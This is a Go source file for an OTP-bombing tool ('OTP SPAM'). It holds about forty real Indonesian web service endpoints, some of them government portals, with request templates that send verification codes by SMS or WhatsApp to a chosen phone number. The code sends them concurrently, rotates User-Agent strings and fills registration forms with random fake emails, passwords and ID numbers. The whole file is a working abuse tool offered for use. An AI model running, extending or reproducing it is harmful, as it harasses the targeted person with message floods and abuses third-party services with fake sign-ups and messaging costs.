package spamotp

import (
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"s/utils"
)

type API struct {
	Name        string
	URL         string
	Method      string
	Data        string
	ContentType string
	SuccessOn   []string
}

type Result struct {
	Target  string
	Success int
	Failed  int
	Total   int
	Debug   bool
}

type DebugInfo struct {
	Name   string
	Status string
	Code   int
	Body   string
}

var apis = []API{
	{Name: "HRS-BRE", URL: "https://career.hrs-bre.site/auth/sign_up_action", Method: "POST", Data: "nik={nik}&email={email}&whatsapp={08}&username={rand}&password={pass}", ContentType: "multipart", SuccessOn: []string{"success", "berhasil", "otp"}},
	{Name: "EraFone", URL: "https://jeanne.eraspace.com/customers/v2.1/otp/request", Method: "POST", Data: `{"identifier":"{08}","type":"identifier_validation"}`, ContentType: "json", SuccessOn: []string{"Success", "otp"}},
	{Name: "PlanetBan", URL: "https://api.planetban.com/website/customer/request-otp", Method: "POST", Data: `{"name":"Test","phone":"{08}","password":"Test123","purpose":"register","method":"whatsapp"}`, ContentType: "json", SuccessOn: []string{"success", "status"}},
	{Name: "TuneUp", URL: "https://api.tuneup.id/v1/mitra/register/send-otp", Method: "POST", Data: "company_name=PT+Test&owner_name=Test&address=Jl+Test&email={email}&phone_number={08}&province_code=32&city_code=32.04&subscription_id=undefined&channel=whatsapp&agreement=true&service_categories[]=3", ContentType: "form", SuccessOn: []string{"success"}},
	{Name: "HashMicro", URL: "https://website-api.hashmicro.com/api/add/3", Method: "POST", Data: "fullname=Test&phonenumber={08}&email={email}&companyname=PT+Test&company_size=small&solution=43&industry=178&message=Test&country=100&source=143&medium=55&type_button=mulai-konsultasi&user_agent=Mozilla/5.0&user_device=mobile", ContentType: "form", SuccessOn: []string{"success", "terimakasih", "thank"}},
	{Name: "Klook", URL: "https://www.klook.com/v2/userapisrv/public/verification/code/send", Method: "POST", Data: `{"action":"login_register","type":1,"rcv":"{+62}","is_resend":false,"payload":{"mobile":"{+62}","term_ids":[330],"mobile_token":"","invite_code":""}}`, ContentType: "json", SuccessOn: []string{"requestId"}},
	{Name: "Internet Rakyat", URL: "https://internetrakyat.id/api/app/auth/send-otp-register", Method: "POST", Data: `{"phone_number":"{08}"}`, ContentType: "json", SuccessOn: []string{"statusCode", "200"}},
	{Name: "Ultramilk", URL: "https://ultramilk-clp.kata.ai/api/ultramilk/register", Method: "POST", Data: `{"name":"Test","email":"{email}","password":"{pass}","phone_number":"{08}","portal":"IcownicPatch","is_consent":true}`, ContentType: "json", SuccessOn: []string{"success"}},
	{Name: "Kaniva", URL: "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp", Method: "POST", Data: `{"name":"Test","phone":"{08}"}`, ContentType: "json", SuccessOn: []string{"success"}},
	{Name: "Jembatani", URL: "https://api.jembatani.co.id/v1/register", Method: "POST", Data: `{"phone_number":"{08}","name":"Test","role":"farmer","password":"{pass}","password_confirmation":"{pass}","consent":"1"}`, ContentType: "json", SuccessOn: []string{"success"}},
	{Name: "RCX", URL: "https://sso.rcx.co.id/auth/passwordless/request", Method: "POST", Data: "mode=register&channel=whatsapp&name=Test&email={email}&identifier={08}", ContentType: "form", SuccessOn: []string{"challenge", "redirect"}},
	{Name: "Sahabat Teknisi", URL: "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone", Method: "POST", Data: `{"phone":"{08}"}`, ContentType: "json", SuccessOn: []string{"success"}},
	{Name: "Auto2000", URL: "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp", Method: "POST", Data: `{"phoneNumber":"{08}","isCheckOtpLimit":true,"uniqueID":"{08}","isLogin":false}`, ContentType: "json", SuccessOn: []string{"acknowledge", "1"}},
	{Name: "Astra Daihatsu", URL: "https://www.astra-daihatsu.id/otp/whatsapp/generate", Method: "POST", Data: `{"phoneNo":"{+62}"}`, ContentType: "json", SuccessOn: []string{"Success"}},
	{Name: "Royal Canin", URL: "https://club.royalcanin.id/api/get_otp", Method: "POST", Data: `{"params":{"Email":"","mobile_number":"{+62}","OTPType":"IM"}}`, ContentType: "json", SuccessOn: []string{"SUCCESS"}},
	{Name: "Watsons", URL: "https://api.watsons.co.id/api/v2/wtcid/otpToken", Method: "POST", Data: `{"uid":"","action":"GENERAL","countryCode":"62","target":"{08}","type":"WHATSAPP"}`, ContentType: "json", SuccessOn: []string{"token"}},
	{Name: "99.co", URL: "https://www.99.co/id/api/biz/messaging/otp-events", Method: "POST", Data: `{"brand":"99id","destination_address":"{+62}","type_id":2}`, ContentType: "json", SuccessOn: []string{"ok"}},
	{Name: "Beli Rumah", URL: "https://api.belirumah.co/api/otp/request_new", Method: "POST", Data: `{"phone_number":"{+62}"}`, ContentType: "json", SuccessOn: []string{"success", "otp"}},
	{Name: "Fastwork", URL: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", Method: "POST", Data: `{"phone_number":"{08}"}`, ContentType: "json", SuccessOn: []string{"reference_code"}},
	{Name: "Beautyhaul", URL: "https://www.beautyhaul.com/ajax/account/send_otp", Method: "POST", Data: `{"method":"WhatsApp"}`, ContentType: "json", SuccessOn: []string{}},
	{Name: "Hainaya", URL: "https://app.hainaya.id/api/onboarding/register", Method: "POST", Data: `{"business_name":"Test","vertical":"salon","vendor_type":"nail_salon","business_phone":"{phone}","owner_name":"","owner_phone":"{phone}"}`, ContentType: "json", SuccessOn: []string{"otp", "success", "tenant_id"}},
	{Name: "MinumYukKaka", URL: "https://minumyukkaka.com/services/identity/requestOTP", Method: "POST", Data: "destination={08}&otpLength=6", ContentType: "form", SuccessOn: []string{"IsSuccess", "success"}},
	{Name: "SIDEMANG", URL: "https://sidemang.palembang.go.id/api/users/register/send-otp", Method: "POST", Data: `{"phoneNumber":"{08}","email":"{email}"}`, ContentType: "json", SuccessOn: []string{"otpDispatched"}},
	{Name: "LaporMasBup", URL: "https://lapormasbup.klaten.go.id/api/register", Method: "POST", Data: `{"name":"Test","email":"{email}","mobilephone":"{08}","gender":"Laki-Laki","warga_birth_date":"2000-01-01","password":"{pass}","address":"Jl Test"}`, ContentType: "json", SuccessOn: []string{"berhasil", "warga_id"}},
	{Name: "PTSP Kemenag", URL: "https://dev-ptsp.kemenag.go.id/api/auth/register", Method: "POST", Data: `{"nama":"Test","wa":"{08}","email":"{email}","password":"{pass}"}`, ContentType: "json", SuccessOn: []string{"success", "user"}},
	{Name: "Pinhome", URL: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", Method: "POST", Data: `{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{phone}"}`, ContentType: "json", SuccessOn: []string{"secretcode"}},
	{Name: "Maulagi", URL: "https://api.maulagi.id/api/v2/auth/check", Method: "POST", Data: `{"credentials":"{08}"}`, ContentType: "json", SuccessOn: []string{"status"}},
	{Name: "Rumah123", URL: "https://www.rumah123.com/api/otp/request-otp", Method: "POST", Data: `{"cancelledRequestId":"{uuid}","ipAddress":"{ip}","phoneNumber":"{62}","portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login"}`, ContentType: "json", SuccessOn: []string{"requestid"}},
	{Name: "Paper", URL: "https://register.paper.id/api/v1/auth/register/send-otp", Method: "POST", Data: `{"phone":"{62}","method":"whatsapp","registered_by":"flutter mweb"}`, ContentType: "json", SuccessOn: []string{"otp"}},
	{Name: "DuniaGames", URL: "https://api.duniagames.co.id/api/user/api/v2/user/send-otp", Method: "POST", Data: `{"phoneNumber":"{+62}","userName":"{phone}"}`, ContentType: "json", SuccessOn: []string{"otp"}},
	{Name: "Bunda Hospital", URL: "https://cms.bunda.co.id/api/v1/auth/send-otp", Method: "POST", Data: `{"phone_number":"{phone}","type":"auth"}`, ContentType: "json", SuccessOn: []string{"otp"}},
	{Name: "BonusBelanja", URL: "https://www.bonusbelanja.com/api/auth/registration/app", Method: "POST", Data: `{"phone":"{62}","name":"User","agreeTnc":true,"agreeContact":true}`, ContentType: "json", SuccessOn: []string{"error", "false"}},
	{Name: "Matahari", URL: "https://matahari-backend-prod.matahari.com/api/auth/register", Method: "POST", Data: `{"emailAddress":"{email}","name":"User","mobileCountryCode":"","mobileNumber":"{08}","birthDate":"2000-01-01","genderId":"1","password":"{pass}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}`, ContentType: "json", SuccessOn: []string{"otp", "success", "already"}},
	{Name: "Alodokter", URL: "https://www.alodokter.com/resend-otp", Method: "POST", Data: `{"user":{"phone":"{08}","uuid":"{uuid}"},"request_via":"whatsapp"}`, ContentType: "json", SuccessOn: []string{"otp", "success"}},
	{Name: "Dokterin", URL: "https://api.dokterin.id/user/v1/users/login", Method: "POST", Data: `{"phone":"{62}","tnc_accept":true}`, ContentType: "json", SuccessOn: []string{"otp", "success"}},
	{Name: "SiCepat", URL: "https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/{62}?sms=false", Method: "GET", Data: "", ContentType: "", SuccessOn: []string{"success"}},
	{Name: "Blibli Tiket", URL: "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate", Method: "POST", Data: `{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"{62}","recaptchaToken":""}`, ContentType: "json", SuccessOn: []string{"otp", "success"}},
	{Name: "Saturdays", URL: "https://beta.api.saturdays.com/api/v1/user/otp/send", Method: "POST", Data: `{"number":"{phone}","country_code":"+62","type":""}`, ContentType: "json", SuccessOn: []string{"otp", "success"}},
	{Name: "Gritero", URL: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", Method: "POST", Data: `{"nama_lengkap":"User","telepon":"{08}","email":"{email}"}`, ContentType: "json", SuccessOn: []string{"otp", "success"}},
	{Name: "Adiraku", URL: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", Method: "POST", Data: `{"mobileNumber":"{phone}","type":"prospect-create","channel":"whatsapp"}`, ContentType: "json", SuccessOn: []string{"otp", "success"}},
}

func Spam(target string, debug bool) *Result {
	number := normalize(target)
	r := &Result{Target: number, Total: len(apis), Debug: debug}

	fmt.Println(utils.Div())
	fmt.Println(utils.Bld(utils.Wht("[ OTP SPAM ]")))
	fmt.Println(utils.Gry(fmt.Sprintf("Target: %s", number)))
	fmt.Println(utils.Gry(fmt.Sprintf("Total APIs: %d", len(apis))))
	fmt.Println(utils.Gry(fmt.Sprintf("Debug: %v", debug)))
	fmt.Println(utils.Div())

	var wg sync.WaitGroup
	var mu sync.Mutex
	debugs := make([]DebugInfo, 0)

	sem := make(chan struct{}, 5)

	for i, api := range apis {
		wg.Add(1)
		go func(idx int, a API) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			code, body := sendOTP(a, number)

			mu.Lock()
			success := false
			status := "FAILED"

			if code >= 200 && code < 300 {
				success = true
				status = "SENT"
				bodyLower := strings.ToLower(body)
				for _, kw := range a.SuccessOn {
					if strings.Contains(bodyLower, strings.ToLower(kw)) {
						success = true
						status = "SENT"
						break
					}
				}
			}

			if success {
				r.Success++
			} else {
				r.Failed++
			}

			if debug {
				debugs = append(debugs, DebugInfo{Name: a.Name, Status: status, Code: code, Body: body})
			}
			mu.Unlock()

			if debug {
				mu.Lock()
				fmt.Println(utils.Gry(fmt.Sprintf("[DEBUG] %s -> %d", a.Name, code)))
				fmt.Println(utils.Gry("  Body: " + truncate(body, 200)))
				mu.Unlock()
			} else {
				if success {
					fmt.Println(utils.Grn(fmt.Sprintf("[%02d] %-16s SENT", idx+1, a.Name)))
				} else {
					fmt.Println(utils.Red(fmt.Sprintf("[%02d] %-16s FAILED", idx+1, a.Name)))
				}
			}
		}(i, api)
	}

	wg.Wait()

	fmt.Println(utils.Div())
	fmt.Println(utils.Gry(fmt.Sprintf("Success: %d | Failed: %d", r.Success, r.Failed)))

	return r
}

func sendOTP(api API, number string) (int, string) {
	payload := buildPayload(api.Data, number)

	client := &http.Client{Timeout: 15 * time.Second}
	var req *http.Request
	var err error

	if api.Method == "GET" {
		req, err = http.NewRequest("GET", api.URL, nil)
	} else {
		switch api.ContentType {
		case "json":
			req, err = http.NewRequest("POST", api.URL, strings.NewReader(payload))
			req.Header.Set("Content-Type", "application/json")
		case "form":
			req, err = http.NewRequest("POST", api.URL, strings.NewReader(payload))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		default:
			req, err = http.NewRequest("POST", api.URL, strings.NewReader(payload))
		}
	}

	if err != nil {
		return 0, ""
	}

	req.Header.Set("User-Agent", randomUA())
	req.Header.Set("Accept", "application/json, text/plain, */*")

	resp, err := client.Do(req)
	if err != nil {
		return 0, ""
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

func buildPayload(template, number string) string {
	p := template

	phone08 := "0" + number[2:]
	phone62 := number
	phonePlus := "+" + number
	phoneRaw := number[2:]

	p = strings.ReplaceAll(p, "{08}", phone08)
	p = strings.ReplaceAll(p, "{62}", phone62)
	p = strings.ReplaceAll(p, "{+62}", phonePlus)
	p = strings.ReplaceAll(p, "{phone}", phoneRaw)
	p = strings.ReplaceAll(p, "{email}", rndEmail())
	p = strings.ReplaceAll(p, "{pass}", rndPass())
	p = strings.ReplaceAll(p, "{rand}", rndString(8))
	p = strings.ReplaceAll(p, "{nik}", rndDigits(16))
	p = strings.ReplaceAll(p, "{uuid}", rndUUID())
	p = strings.ReplaceAll(p, "{ip}", "127.0.0.1")

	return p
}

func normalize(phone string) string {
	phone = strings.ReplaceAll(phone, " ", "")
	phone = strings.ReplaceAll(phone, "-", "")
	phone = strings.ReplaceAll(phone, "+", "")
	if strings.HasPrefix(phone, "08") {
		return "62" + phone[1:]
	}
	if strings.HasPrefix(phone, "8") {
		return "62" + phone
	}
	return phone
}

func rndString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func rndDigits(n int) string {
	const digits = "0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = digits[rand.Intn(len(digits))]
	}
	return string(b)
}

func rndEmail() string {
	return rndString(8) + rndDigits(3) + "@gmail.com"
}

func rndPass() string {
	return "Pass" + rndDigits(3) + rndString(3) + "@1"
}

func rndUUID() string {
	return fmt.Sprintf("%s-%s-%s-%s-%s", rndDigits(8), rndDigits(4), rndDigits(4), rndDigits(4), rndDigits(12))
}

func randomUA() string {
	uas := []string{
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	}
	return uas[rand.Intn(len(uas))]
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

var _ = bytes.NewBuffer
